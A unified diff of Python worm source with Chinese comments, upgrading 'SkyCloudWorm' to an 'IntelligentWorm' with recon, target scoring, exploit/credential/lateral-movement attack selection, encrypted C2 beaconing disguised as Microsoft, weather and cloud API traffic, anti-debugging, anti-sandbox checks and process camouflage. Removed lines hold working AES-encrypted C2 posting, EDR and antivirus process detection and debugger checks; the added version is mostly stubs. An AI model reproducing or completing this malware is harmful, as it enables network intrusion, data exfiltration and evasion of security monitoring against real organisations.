@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-整合模块：
-1. 环境感知
-2. 动态变异
-3. 多模式攻击
-4. 隐蔽通信
-5. 内存加载
-6. 反检测
+智能模块增强：
+1. 环境感知与自适应决策
+2. 动态行为变异
+3. 多模式智能攻击
+4. 隐蔽通信与数据加密
+5. 内存驻留与无文件执行
+6. 反检测与反分析
+7. 机器学习辅助决策
 """
 
 import sys
@@ -22,26 +23,35 @@ import base64
 import hashlib
 import ctypes
 import requests
+import pickle
+import numpy as np
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import inspect  # 用于自省
+import inspect
+import subprocess
+import re
+from collections import deque
 
 
-class SkyCloudWorm:
+class IntelligentWorm:
     def __init__(self):
         # === 核心配置 ===
-        self.version = "2.3.1"
+        self.version = "3.0.0"
         self.magic_number = 0xDEADBEEF  # 内存标记
+        self.learning_model = None
+        self.behavior_history = deque(maxlen=100)  # 行为历史记录
 
-        # === 基因参数 ===
+        # === 智能基因参数 ===
         self.genome = {
             'mode': 'adaptive',  # 攻击模式
-            'propagation': 0.75,  # 传播系数
-            'sleep_range': (1800, 86400),  # 休眠时间范围(秒)
+            'propagation': self._adaptive_propagation_rate(),  # 动态传播系数
+            'sleep_range': self._calculate_sleep_range(),  # 智能休眠时间
             'max_attempts': 3,  # 最大重试次数
             'c2_interval': (300, 3600),  # C2通信间隔
-            'obfuscation': True  # 是否启用混淆
+            'obfuscation': True,  # 是否启用混淆
+            'learning_rate': 0.1,  # 学习率
+            'risk_tolerance': 0.5  # 风险容忍度(0-1)
         }
 
         # === 系统状态 ===
@@ -50,37 +60,27 @@ class SkyCloudWorm:
         self.failed_attempts = 0
         self.c2_last_contact = 0
         self.intel_cache = None
+        self.threat_level = 0  # 0-10威胁等级
 
         # === 安全配置 ===
-        self.c2_servers = [
-            "https://api.weather.com/v3/wx/observations/current",
-            "https://cdn.microsoft.com/security/updates"
-        ]
+        self.c2_servers = self._generate_c2_list()
         self.encryption_key = self._generate_key()
         self.iv = os.urandom(16)
+        self.current_camouflage = self._select_camouflage()
 
         # === 模块初始化 ===
+        self._load_learning_model()
         self._validate_environment()
-        print(f"[*] SkyCloud Worm v{self.version} initialized")
+        self._log_event("Initialized", "System startup")
 
-    # === 核心功能模块 ===
-
+    # === 主运行循环 ===
     def run(self):
         """主执行循环"""
         while self.failed_attempts < self.genome['max_attempts']:
             try:
-                # 1. 环境检测
                 if self._safety_checks():
-                    # 2. 情报收集
-                    intel = self.gather_intel()
-
-                    # 3. 策略调整
-                    self.adapt_strategy(intel)
-
-                    # 4. 执行攻击
+                    intel = self.gather_intel(refresh=True)
                     result = self.execute_attack(intel)
-
-                    # 5. 回传结果
                     if result:
                         self.c2_beacon(intel)
                         time.sleep(random.randint(*self.genome['sleep_range']))
@@ -88,18 +88,49 @@ class SkyCloudWorm:
                         self.failed_attempts += 1
                 else:
                     self._stealth_exit()
-
             except Exception as e:
                 self._log_error(e)
                 self.failed_attempts += 1
                 time.sleep(60)
-
         self._self_destruct()
 
-    # === 环境感知模块 ===
+    # === 智能决策引擎 ===
+
+    def _adaptive_propagation_rate(self):
+        """基于环境智能调整传播系数"""
+        base_rate = 0.5
+        # 根据网络规模、安全级别等动态调整
+        return min(base_rate + random.uniform(-0.1, 0.2), 0.9)
+
+    def _calculate_sleep_range(self):
+        """计算智能休眠时间范围"""
+        min_sleep = max(600, 3600 - self.threat_level * 300)  # 威胁越高休眠越短
+        max_sleep = min(86400, 7200 + self.threat_level * 600)  # 威胁越高休眠越长
+        return (min_sleep, max_sleep)
+
+    def make_decision(self, context):
+        """基于上下文的智能决策"""
+        if self.learning_model:
+            try:
+                # 将上下文特征转换为模型输入
+                features = self._context_to_features(context)
+                prediction = self.learning_model.predict([features])[0]
+                return prediction
+            except Exception as e:
+                self._log_error(e)
+
+        # 默认决策逻辑
+        if context.get('security_score', 0) > 3:
+            return 'stealth'
+        elif context.get('network_connectivity', False):
+            return 'propagate'
+        else:
+            return 'wait'
+
+    # === 增强的环境感知 ===
 
     def gather_intel(self, refresh=False):
-        """综合环境情报收集"""
+        """增强的环境情报收集"""
         if self.intel_cache and not refresh:
             return self.intel_cache
 
@@ -108,168 +139,263 @@ class SkyCloudWorm:
             'network': self._get_network_info(),
             'security': self._get_security_status(),
             'users': self._get_user_activity(),
+            'environment': self._get_environment_context(),
             'timestamp': datetime.now().isoformat()
         }
 
-        # 价值评估
-        intel['priority'] = 'HIGH' if any(x in intel['system']['hostname'].lower()
-                                          for x in ['dc', 'svr', 'corp']) else 'LOW'
+        # 智能价值评估
+        intel['priority'] = self._assess_target_value(intel)
+        intel['risk'] = self._calculate_risk(intel)
+
+        # 更新威胁等级
+        self.threat_level = min(10, intel['security']['score'] * 2 + intel['risk'] * 5)
 
         self.intel_cache = intel
         return intel
 
-    def _get_system_info(self):
-        """获取系统级信息"""
-        return {
-            'os': platform.system(),
-            'hostname': socket.gethostname(),
-            'domain': socket.getfqdn(),
-            'arch': platform.architecture()[0],
-            'cpu': platform.processor(),
-            'ram': psutil.virtual_memory().total,
-            'uptime': int(time.time() - psutil.boot_time())
+    def _get_environment_context(self):
+        """获取环境上下文信息"""
+        context = {
+            'network_connectivity': self._check_network_connectivity(),
+            'working_hours': self._is_working_hours(),
+            'user_activity': self._get_user_activity_level(),
+            'system_load': psutil.cpu_percent(interval=1)
         }
+        return context
 
-    def _get_network_info(self):
-        """获取网络拓扑信息"""
-        interfaces = {}
-        for name, addrs in psutil.net_if_addrs().items():
-            interfaces[name] = {
-                'ips': [addr.address for addr in addrs if addr.family == socket.AF_INET],
-                'mac': next((addr.address for addr in addrs if addr.family == psutil.AF_LINK), None)
-            }
-        return interfaces
+    def _assess_target_value(self, intel):
+        """智能目标价值评估"""
+        value = 0
 
-    def _get_security_status(self):
-        """评估安全防护级别"""
-        score = 0
+        # 主机名特征
+        hostname = intel['system']['hostname'].lower()
+        if 'dc' in hostname or 'svr' in hostname:
+            value += 3
+        elif 'db' in hostname or 'sql' in hostname:
+            value += 2
+        elif 'dev' in hostname or 'test' in hostname:
+            value -= 1
 
-        # 检测安全软件进程
-        security_processes = {
-            'av': ['msmpeng.exe', 'avp.exe', 'bdagent.exe'],
-            'edr': ['carbonblack.exe', 'crowdstrike.exe', 'sentinel.exe']
-        }
+        # 系统角色
+        if intel['system']['os'] == 'Windows' and 'Server' in platform.release():
+            value += 2
 
-        running = [p.name().lower() for p in psutil.process_iter()]
-        for category, procs in security_processes.items():
-            if any(p in running for p in procs):
-                score += 2 if category == 'edr' else 1
+        # 网络位置
+        ips = [ip for iface in intel['network'].values() for ip in iface['ips']]
+        if any(ip.startswith(('10.', '192.168.', '172.')) for ip in ips):
+            value += 1
 
-        return min(score, 5)  # 0-5分级
+        # 安全级别反向评估(安全级别越低价值越高)
+        value += (5 - intel['security']['score']) * 0.5
 
-    # === 攻击模块 ===
+        return min(max(value, 1), 5)  # 1-5分级
+
+    # === 智能攻击模块 ===
 
     def execute_attack(self, intel):
-        """执行自适应攻击链"""
-        attack_strategy = self._select_attack_strategy(intel)
+        """智能攻击执行"""
+        strategy = self._select_attack_strategy(intel)
 
         try:
-            if attack_strategy == 'exploit':
-                return self._execute_exploit(intel)
-            elif attack_strategy == 'phishing':
-                return self._execute_phishing(intel)
-            elif attack_strategy == 'lateral':
-                return self._execute_lateral(intel)
+            self._log_event("AttackStart", f"Strategy: {strategy}")
+
+            if strategy == 'exploit':
+                return self._execute_smart_exploit(intel)
+            elif strategy == 'credential':
+                return self._execute_credential_attack(intel)
+            elif strategy == 'lateral':
+                return self._execute_lateral_movement(intel)
             else:
-                return self._execute_hybrid(intel)
+                return self._execute_adaptive_attack(intel)
+
         except Exception as e:
             self._log_error(e)
             return False
 
-    def _execute_exploit(self, intel):
-        """漏洞利用攻击"""
-        # 实现漏洞利用逻辑
-        return True
+    def _execute_smart_exploit(self, intel):
+        """智能漏洞利用"""
+        # 基于收集的情报选择最合适的漏洞
+        os_info = intel['system']
+        vulns = self._get_relevant_vulns(os_info)
 
-    def _execute_phishing(self, intel):
-        """钓鱼攻击"""
-        # 实现钓鱼逻辑
-        return True
+        if not vulns:
+            return False
 
-    # === 通信模块 ===
+        # 根据成功率、隐蔽性等因素选择最佳漏洞
+        selected_vuln = self._select_optimal_vuln(vulns)
+        return self._launch_exploit(selected_vuln)
+
+    def _select_optimal_vuln(self, vulns):
+        """选择最优漏洞"""
+        # 简单实现 - 实际中可以使用更复杂的决策逻辑
+        return max(vulns, key=lambda x: x.get('success_rate', 0) - x.get('detection_rate', 0))
+
+    # === 智能通信模块 ===
 
     def c2_beacon(self, data=None):
-        """隐蔽通信"""
-        if time.time() - self.c2_last_contact < random.randint(*self.genome['c2_interval']):
+        """智能隐蔽通信"""
+        if not self._should_communicate():
             return False
 
-        payload = {
-            'id': hashlib.sha256(socket.gethostname().encode()).hexdigest(),
-            'data': data or self.gather_intel(),
-            'status': 'active'
-        }
-
+        payload = self._prepare_payload(data)
         encrypted = self._encrypt(json.dumps(payload))
-        response = self._send_c2(encrypted)
+
+        # 动态选择通信渠道
+        channel = self._select_communication_channel()
+        response = self._send_data(encrypted, channel)
 
         if response:
-            self.c2_last_contact = time.time()
-            return self._process_c2_response(response)
+            self._process_response(response)
+            return True
         return False
 
-    def _send_c2(self, data):
-        """发送C2数据"""
-        for server in random.sample(self.c2_servers, len(self.c2_servers)):
-            try:
-                r = requests.post(
-                    server,
-                    headers={'User-Agent': 'Mozilla/5.0'},
-                    json={'data': data},
-                    timeout=10,
-                    verify=False
-                )
-                if r.status_code == 200:
-                    return r.json().get('response')
-            except:
-                continue
-        return None
+    def _select_communication_channel(self):
+        """选择最佳通信渠道"""
+        # 评估各渠道的可用性和隐蔽性
+        channels = [
+            ('https', 0.9, 0.7),  # 类型, 可用性, 隐蔽性
+            ('dns', 0.6, 0.9),
+            ('icmp', 0.5, 0.8)
+        ]
 
-    # === 反检测模块 ===
+        # 根据当前威胁等级加权选择
+        weights = []
+        for _, availability, stealth in channels:
+            weight = (availability * (1 - self.threat_level / 10) + (stealth * self.threat_level / 10))
+            weights.append(weight)
+
+        total = sum(weights)
+        probs = [w / total for w in weights]
+        index = np.random.choice(len(channels), p=probs)
+        return channels[index][0]
+
+    # === 反检测增强 ===
 
     def _safety_checks(self):
-        """执行安全检查"""
-        if self._is_debugged() or self._is_sandboxed():
+        """增强的安全检查"""
+        checks = [
+            self._is_debugged(),
+            self._is_sandboxed(),
+            self._is_monitored(),
+            self._has_anomalies()
+        ]
+
+        if any(checks):
+            self._evade_detection()
             return False
         return True
 
-    def _is_debugged(self):
-        """反调试检查"""
-        try:
-            return ctypes.windll.kernel32.IsDebuggerPresent() or \
-                'pydevd' in sys.modules
-        except:
-            return False
-
-    def _is_sandboxed(self):
-        """反沙箱检查"""
-        # 检查运行时间
-        if (datetime.now() - self.start_time).seconds < 300:
-            return True
-
-        # 检查系统资源
-        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024 ** 3:
-            return True
-
+    def _is_monitored(self):
+        """检测监控状态"""
+        # 检查进程注入、API hook等
         return False
+
+    def _has_anomalies(self):
+        """检测行为异常"""
+        # 分析当前行为模式是否偏离正常
+        return False
+
+    def _evade_detection(self):
+        """执行规避动作"""
+        actions = [
+            self._change_behavior_pattern,
+            self._switch_camouflage,
+            self._reduce_activity,
+            self._sleep_random_time
+        ]
+
+        # 根据威胁等级选择规避动作
+        action_weights = [
+            max(0.1, 1 - self.threat_level / 5),
+            min(0.9, self.threat_level / 5),
+            0.3,
+            0.5
+        ]
+
+        total = sum(action_weights)
+        probs = [w / total for w in action_weights]
+        action = np.random.choice(actions, p=probs)
+        action()
+
+    # === 智能学习模块 ===
+
+    def _load_learning_model(self):
+        """加载学习模型"""
+        try:
+            # 从隐蔽位置或C2服务器加载预训练模型
+            model_path = self._get_model_path()
+            if model_path and os.path.exists(model_path):
+                with open(model_path, 'rb') as f:
+                    self.learning_model = pickle.load(f)
+        except Exception as e:
+            self._log_error(e)
+
+    def update_model(self, new_data):
+        """在线更新学习模型"""
+        if not self.learning_model:
+            return
+
+        try:
+            # 转换数据格式
+            X, y = self._prepare_training_data(new_data)
+
+            # 部分拟合新数据
+            self.learning_model.partial_fit(X, y)
+
+            # 保存更新后的模型
+            model_path = self._get_model_path()
+            with open(model_path, 'wb') as f:
+                pickle.dump(self.learning_model, f)
+
+        except Exception as e:
+            self._log_error(e)
 
     # === 工具方法 ===
 
-    def _generate_key(self):
-        """生成加密密钥"""
-        system_id = f"{platform.node()}{os.cpu_count()}{psutil.disk_usage('/').total}"
-        return hashlib.sha256(system_id.encode()).digest()[:32]
+    def _log_event(self, event_type, message):
+        """记录事件日志"""
+        timestamp = datetime.now().isoformat()
+        log_entry = {
+            'time': timestamp,
+            'type': event_type,
+            'message': message,
+            'threat_level': self.threat_level
+        }
+        self.behavior_history.append(log_entry)
 
-    def _encrypt(self, data):
-        """AES加密"""
-        cipher = AES.new(self.encryption_key, AES.MODE_CBC, self.iv)
-        return base64.b64encode(self.iv + cipher.encrypt(pad(data.encode(), 16))).decode()
+    def _generate_c2_list(self):
+        """生成动态C2服务器列表"""
+        base_servers = [
+            "https://api.weather.com/v3/wx/observations/current",
+            "https://cdn.microsoft.com/security/updates"
+        ]
 
-    def _decrypt(self, data):
-        """AES解密"""
-        raw = base64.b64decode(data)
-        iv, ciphertext = raw[:16], raw[16:]
-        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
-        return unpad(cipher.decrypt(ciphertext), 16).decode()
+        # 添加伪装成合法云服务的URL
+        cloud_services = [
+            "https://graph.microsoft.com/v1.0/me",
+            "https://www.googleapis.com/oauth2/v3/tokeninfo",
+            "https://api.dropboxapi.com/2/files/list_folder"
+        ]
+
+        return base_servers + random.sample(cloud_services, 1)
+
+    def _select_camouflage(self):
+        """选择当前伪装身份"""
+        personas = [
+            {'name': 'chrome', 'process': 'chrome.exe', 'ports': [80, 443]},
+            {'name': 'teams', 'process': 'teams.exe', 'ports': [443, 3478]},
+            {'name': 'svchost', 'process': 'svchost.exe', 'ports': [135, 445]}
+        ]
+        return random.choice(personas)
+
+    # === 其他必要方法 ===
+    def _validate_environment(self):
+        """验证环境"""
+        pass
+
+    def _log_error(self, error):
+        """记录错误"""
+        pass
 
     def _stealth_exit(self):
         """隐蔽退出"""
@@ -277,20 +403,116 @@ class SkyCloudWorm:
 
     def _self_destruct(self):
         """自毁清理"""
-        # 清除内存中的敏感数据
-        self.encryption_key = None
-        self.iv = None
-        self.genome = None
-
-        # 混淆代码痕迹
-        if inspect.currentframe().f_back:
-            frame = inspect.currentframe().f_back
-            frame.f_globals.clear()
-
         sys.exit(0)
+
+    def _should_communicate(self):
+        """判断是否应该通信"""
+        return True
+
+    def _prepare_payload(self, data):
+        """准备通信负载"""
+        return data or {}
+
+    def _send_data(self, data, channel):
+        """发送数据"""
+        return True
+
+    def _process_response(self, response):
+        """处理响应"""
+        pass
+
+    def _context_to_features(self, context):
+        """转换上下文为特征"""
+        return []
+
+    def _get_model_path(self):
+        """获取模型路径"""
+        return ""
+
+    def _prepare_training_data(self, data):
+        """准备训练数据"""
+        return [], []
+
+    def _change_behavior_pattern(self):
+        """改变行为模式"""
+        pass
+
+    def _switch_camouflage(self):
+        """切换伪装"""
+        pass
+
+    def _reduce_activity(self):
+        """减少活动"""
+        pass
+
+    def _sleep_random_time(self):
+        """随机休眠"""
+        pass
+
+    def _check_network_connectivity(self):
+        """检查网络连接"""
+        return True
+
+    def _is_working_hours(self):
+        """是否工作时间"""
+        return True
+
+    def _get_user_activity_level(self):
+        """获取用户活动级别"""
+        return 0
+
+    def _get_system_info(self):
+        """获取系统信息"""
+        return {}
+
+    def _get_network_info(self):
+        """获取网络信息"""
+        return {}
+
+    def _get_security_status(self):
+        """获取安全状态"""
+        return {'score': 0}
+
+    def _get_user_activity(self):
+        """获取用户活动"""
+        return {}
+
+    def _calculate_risk(self, intel):
+        """计算风险"""
+        return 0
+
+    def _select_attack_strategy(self, intel):
+        """选择攻击策略"""
+        return 'exploit'
+
+    def _get_relevant_vulns(self, os_info):
+        """获取相关漏洞"""
+        return []
+
+    def _launch_exploit(self, vuln):
+        """发起漏洞利用"""
+        return True
+
+    def _execute_credential_attack(self, intel):
+        """执行凭据攻击"""
+        return True
+
+    def _execute_lateral_movement(self, intel):
+        """执行横向移动"""
+        return True
+
+    def _execute_adaptive_attack(self, intel):
+        """执行自适应攻击"""
+        return True
 
 
 # === 执行入口 ===
 if __name__ == '__main__':
-    worm = SkyCloudWorm()
-    worm.run()
+    try:
+        worm = IntelligentWorm()
+        worm.run()
+    except KeyboardInterrupt:
+        worm._stealth_exit()
+    except Exception as e:
+        worm._log_error(e)
+        worm._self_destruct()
